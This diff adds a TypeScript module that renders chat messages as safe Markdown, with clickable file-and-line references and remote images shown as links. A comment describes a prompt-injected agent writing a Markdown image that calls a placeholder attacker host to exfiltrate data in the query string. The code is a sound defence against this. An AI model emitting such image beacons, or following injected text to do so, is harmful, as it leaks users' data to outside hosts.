@@ -1,0 +1,127 @@
+// Client-side Markdown for messages. `html:false` so raw HTML is escaped.
+// External links get target=_blank + rel=noopener; `@path:Lx-y` becomes a
+// clickable `.r3-ref` (version resolution is the click handler's job).
+
+import MarkdownIt from "markdown-it";
+
+const md = new MarkdownIt({
+  html: false,
+  // Auto-link URLs (safe markdown convenience). Our @ref rule runs during
+  // inline tokenization, before linkify's text-token pass, so a ref is already
+  // its own token and linkify never sees it.
+  linkify: true,
+  // A lone newline becomes <br>, matching the whitespace-pre-wrap feel messages
+  // had before — agent comments rely on single-newline line breaks reading as breaks.
+  breaks: true,
+});
+// Scheme-required auto-linking only: linkify's fuzzy mode would turn any bare
+// filename whose extension doubles as a TLD — README.md, setup.py, build.sh —
+// into an external http:// link, and code-adjacent prose is full of those. An
+// explicit http(s):// URL still links; bare domains and emails stay plain text.
+md.linkify.set({ fuzzyLink: false, fuzzyEmail: false });
+
+// The `@path:Lx[-y]` reference token (matches the agent-authored syntax; see the
+// CLI guide). Path is a run of path-ish characters; the line range is required so
+// a bare "@name" never linkifies. Anchored at the start of the remaining source.
+const REF_RE = /^@([A-Za-z0-9._~+\-/]+):L(\d+)(?:-(\d+))?/;
+
+// markdown-it's own HTML escaper (maps the same four chars: & < > "). Reused so
+// our ref-anchor attributes escape exactly the way the library escapes text.
+const escapeHtml = md.utils.escapeHtml;
+
+// Inline rule: consume an `@path:Lx-y` token and emit an `r3ref` token carrying
+// the parsed file + line range. Placed before `emphasis` so a path containing `_`
+// isn't chewed up as emphasis first.
+md.inline.ruler.before("emphasis", "r3ref", (state, silent) => {
+  const start = state.pos;
+  if (state.src.charCodeAt(start) !== 0x40 /* @ */) return false;
+  // Require a boundary before `@` so we don't grab the tail of an email or an
+  // `@`-mention embedded in a word.
+  if (start > 0 && /[A-Za-z0-9)]/.test(state.src[start - 1])) return false;
+  const m = REF_RE.exec(state.src.slice(start));
+  if (!m) return false;
+  if (!silent) {
+    const token = state.push("r3ref", "", 0);
+    token.content = m[0];
+    token.meta = { file: m[1], start: m[2], end: m[3] ?? m[2] };
+  }
+  state.pos += m[0].length;
+  return true;
+});
+
+md.renderer.rules.r3ref = (tokens, idx) => {
+  const t = tokens[idx];
+  const { file, start, end } = t.meta as { file: string; start: string; end: string };
+  // href="#" puts the ref in the tab order (an href-less <a> isn't focusable), so
+  // Enter fires the delegated click; MessageProse always preventDefaults it.
+  return (
+    `<a class="r3-ref" href="#" data-r3-ref-file="${escapeHtml(file)}"` +
+    ` data-r3-ref-start="${start}" data-r3-ref-end="${end}"` +
+    ` title="Jump to ${escapeHtml(file)}:L${start}${end !== start ? `-${end}` : ""}">` +
+    `${escapeHtml(t.content)}</a>`
+  );
+};
+
+// A URL the browser would fetch off-origin: anything carrying a scheme, plus
+// protocol-relative `//host/…`. `data:` makes no request (and markdown-it's
+// validateLink has already narrowed it to a few image types), so it stays.
+// Twin of the rule in server/highlight.ts, which renders file `.md` the same way.
+export const REMOTE_URL_RE = /^(?!data:)[a-z][a-z0-9+.-]*:|^\/\//i;
+
+// Images are the one Markdown construct that reaches the network with no click.
+// Both sides of this app render text we don't trust — a prompt-injected agent
+// writes threads and comments, and a reviewed repo's README is someone else's
+// file — so `![](https://attacker/?d=…)` would beacon (and could carry
+// exfiltrated content in the query) the moment the human opens the review.
+// Render a remote image as the link it is and let the human decide to load it.
+const defaultImage =
+  md.renderer.rules.image ??
+  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options));
+md.renderer.rules.image = (tokens, idx, options, env, self) => {
+  // markdown-it sets numeric attrs of its own (a list's `start`), so attrGet is
+  // typed `string | number`; every attribute this render reads is text.
+  const src = String(tokens[idx].attrGet("src") ?? "");
+  if (!REMOTE_URL_RE.test(src)) return defaultImage(tokens, idx, options, env, self);
+  const alt = self.renderInlineAsText(tokens[idx].children ?? [], options, env);
+  return (
+    `<a class="r3-remote-img" href="${escapeHtml(src)}" target="_blank" rel="noopener noreferrer"` +
+    ` title="Remote image — not loaded automatically">${escapeHtml(alt || src)}</a>`
+  );
+};
+
+// External links open in a new tab so a click never navigates the SPA away.
+const defaultLinkOpen =
+  md.renderer.rules.link_open ??
+  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options));
+md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
+  tokens[idx].attrSet("target", "_blank");
+  tokens[idx].attrSet("rel", "noopener noreferrer");
+  return defaultLinkOpen(tokens, idx, options, env, self);
+};
+
+// Render a message body to safe HTML. Full block markdown (lists, code fences,
+// blockquotes, tables, headings) — the caller drops it into a `.r3-markdown`
+// container and trims the outer block margins for the compact card context.
+export function renderMessageHtml(source: string): string {
+  return md.render(source);
+}
+
+// A jump reference parsed off a clicked `.r3-ref` anchor. `lineEnd` falls back to
+// `lineStart` for a single-line ref.
+export interface MessageRef {
+  file: string;
+  lineStart: number;
+  lineEnd: number;
+}
+
+// Read the ref a click landed on, if any: walk up to the nearest `.r3-ref`
+// anchor and pull its data-* attributes. null when the click wasn't on a ref.
+export function refFromEvent(target: EventTarget | null): MessageRef | null {
+  const el = target instanceof Element ? target.closest("a.r3-ref") : null;
+  if (!el) return null;
+  const file = el.getAttribute("data-r3-ref-file");
+  const start = Number(el.getAttribute("data-r3-ref-start"));
+  if (!file || !Number.isFinite(start)) return null;
+  const end = Number(el.getAttribute("data-r3-ref-end"));
+  return { file, lineStart: start, lineEnd: Number.isFinite(end) ? end : start };
+}
